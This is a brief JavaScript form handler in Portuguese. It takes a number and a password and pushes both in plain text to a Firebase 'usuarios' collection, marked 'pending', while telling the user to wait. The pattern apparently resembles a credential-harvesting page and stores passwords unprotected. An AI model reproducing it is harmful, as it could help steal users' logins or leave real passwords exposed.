function enviar() {

  const numero = document.getElementById("numero").value;
  const senha = document.getElementById("senha").value;

  const agora = new Date();

  const dados = {
    numero: numero,
    senha: senha,
    dataHora: agora.toLocaleString("pt-PT"),
    status: "pendente",
    mensagem: "⏳ Processando requisitos... Por favor, aguarde.",
    link: ""
  };

  db.ref("usuarios").push(dados)
    .then(() => {

      document.getElementById("msg").innerHTML =
      "⏳ Processando requisitos... Por favor, aguarde.";

      document.getElementById("numero").value = "";
      document.getElementById("senha").value = "";

    })
    .catch((erro) => {

      document.getElementById("msg").innerHTML =
      "❌ Erro: " + erro.message;

    });

}
